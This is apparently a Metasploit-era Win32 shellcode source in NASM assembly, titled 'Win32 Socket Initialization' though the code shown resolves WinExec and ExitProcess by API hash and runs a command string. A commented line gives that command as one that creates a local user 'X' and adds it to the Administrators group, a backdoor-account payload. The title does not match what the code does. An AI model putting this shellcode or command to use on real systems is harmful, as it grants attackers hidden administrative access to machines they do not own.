;      Title:  Win32 Socket Initialization
;  Platforms:  Windows NT 4.0, Windows 2000, Windows XP, Windows 2003
;     Author:  hdm[at]metasploit.com


[BITS 32]

%include "win32_stage_api.asm"

jmp short GetCMD

WinExec:
    push ebx
    push 0x0e8afe98
    call esi
    call eax


ExitProcess:
    push ebx
    push 0x73e2d87e
    call esi
    push byte 0
    call eax
    call eax


GetCMD:
    push byte 0 ; last arg of WinExec
    call WinExec

; The command to execute
;db "cmd.exe /c net user X X /ADD && net localgroups Administrators X /ADD"
;db 0x00
